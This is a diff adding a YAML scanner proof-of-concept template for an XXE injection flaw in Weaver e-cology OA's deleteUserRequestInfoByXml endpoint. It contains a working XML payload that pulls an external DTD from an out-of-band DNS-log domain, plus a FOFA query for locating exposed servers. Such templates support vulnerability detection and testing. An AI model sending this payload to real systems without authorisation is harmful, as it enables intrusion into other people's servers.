@@ -1,0 +1,25 @@
+id: poc-yaml-weaver-e-cology-deleteuserrequestInfobyxml-xxe
+info:
+  name: 泛微OA E-Cology deleteUserRequestInfoByXml XXE注入漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: e-cology
+  fofa: app="泛微-OA（e-cology）"
+variables:
+  reverse: new_dns_log()
+  reverseDomain: reverse.Domain()
+requests:
+- method: POST
+  path: /rest/ofs/deleteUserRequestInfoByXml
+  headers:
+    Content-Type: application/xml
+  data: '<?xml version="1.0" encoding="utf-8"?>
+
+    <!DOCTYPE syscode SYSTEM "http://{{.reverseDomain}}">
+
+    <M><syscode>&send;</syscode></M>'
+  expression: "status_code == 200 && \nreverse.Verify() &&\ncontains(headers,\"ecology_JSessionid\"\
+    )\n"
+transport: http
